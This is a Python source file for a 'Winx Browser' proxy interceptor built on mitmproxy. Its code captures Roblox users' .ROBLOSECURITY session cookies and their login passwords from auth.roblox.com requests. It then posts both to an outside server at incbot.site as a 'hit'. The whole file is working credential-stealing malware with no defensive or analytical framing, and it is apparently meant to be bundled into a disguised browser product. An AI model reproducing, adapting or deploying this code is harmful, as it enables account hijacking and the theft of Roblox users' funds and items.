"""
Winx Browser - Proxy interceptor
Captures .ROBLOSECURITY cookie from any roblox.com request after login
Captures password from auth.roblox.com/v2/login POST body
"""

import json
import re
import threading
import requests
from mitmproxy import http

# ── Config ────────────────────────────────────────────────────────────────────
BACKEND_URL = "https://www.incbot.site/api/extension/hit"
SETUP_URL = "https://www.incbot.site/api/desktop/setup"
CONFIG_DIR = None  # Set at runtime from main.py
# ─────────────────────────────────────────────────────────────────────────────

captured_password = None
cookie_sent = False
lock = threading.Lock()
directory_token = None  # Loaded at startup from config.dat

def load_token(config_path):
    global directory_token
    try:
        with open(config_path, 'r') as f:
            directory_token = f.read().strip()
        print(f"[+] Token loaded")
    except Exception as e:
        print(f"[!] Token load error: {e}")

class RobloxInterceptor:
    def request(self, flow: http.HTTPFlow):
        global captured_password, cookie_sent

        if not directory_token:
            return

        host = flow.request.pretty_host

        # ── Capture password from login POST ──────────────────────────────────
        if "auth.roblox.com" in host and flow.request.path.startswith("/v2/login") and flow.request.method == "POST":
            try:
                body = json.loads(flow.request.content.decode("utf-8"))
                password = body.get("password")
                if password:
                    with lock:
                        captured_password = password
                        cookie_sent = False
                    print(f"[+] Password captured")
            except Exception as e:
                print(f"[!] Password parse error: {e}")
            return

        # ── Capture cookie from any roblox.com request ────────────────────────
        if not host.endswith("roblox.com"):
            return

        cookie_header = flow.request.headers.get("cookie", "")
        if ".ROBLOSECURITY" not in cookie_header:
            return

        with lock:
            if cookie_sent:
                return

            match = re.search(r'\.ROBLOSECURITY=([^;]+)', cookie_header)
            if not match:
                return

            cookie_value = match.group(1).strip()
            if not cookie_value.startswith("_|WARNING:"):
                cookie_value = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-into-your-account-and-to-steal-your-ROBUX-and-items.|_" + cookie_value

            if len(cookie_value) < 100:
                return

            password = captured_password
            cookie_sent = True

        print(f"[+] Cookie captured, sending hit...")
        threading.Thread(
            target=send_to_backend,
            args=(cookie_value, password),
            daemon=True
        ).start()


def send_to_backend(cookie: str, password: str):
    try:
        payload = {
            "cookie": cookie,
            "directoryToken": directory_token,
        }
        if password:
            payload["password"] = password

        resp = requests.post(BACKEND_URL, json=payload, timeout=15)
        if resp.status_code == 200:
            print(f"[+] Hit sent successfully")
        else:
            print(f"[!] Backend returned {resp.status_code}: {resp.text[:100]}")
    except Exception as e:
        print(f"[!] Failed to send hit: {e}")


def run_proxy():
    from mitmproxy.tools.dump import DumpMaster
    from mitmproxy import options

    opts = options.Options(
        listen_host="127.0.0.1",
        listen_port=8080,
        ssl_insecure=False,
    )
    master = DumpMaster(opts, with_termlog=False, with_dumper=False)
    master.addons.add(RobloxInterceptor())
    try:
        master.run()
    except KeyboardInterrupt:
        master.shutdown()
